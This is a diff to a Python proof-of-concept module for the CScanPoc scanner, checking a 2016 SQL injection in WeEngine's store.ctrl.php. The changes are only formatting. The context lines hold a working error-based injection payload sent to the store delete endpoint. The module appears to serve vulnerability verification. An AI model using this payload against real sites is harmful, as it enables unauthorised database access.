@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'we7_0002_L' # 平台漏洞编号，留空
+    vuln_id = 'we7_0002_L'  # 平台漏洞编号，留空
     name = '微擎普通用户权限SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2016-07-13'  # 漏洞公布时间
     desc = '''
         漏洞文件：/web/source/mc/store.ctrl.php
@@ -34,16 +35,16 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #登录用户
+            # 登录用户
             s = requests.session()
-            #获取cookies
+            # 获取cookies
             cookies = {}
             '''
             raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
             for line in raw_cookies.split(';'):  
                 key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                 cookies[key]=value 
-            ''' 
+            '''
             s.get(self.target + '/web/index.php', cookies=cookies)
             payload = "/web/index.php?c=mc&a=store&do=delete"
             data = "id[]=a\&id[]=) and extractvalue(1, concat(0x5c, (select md5(c))))--"
@@ -59,6 +60,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
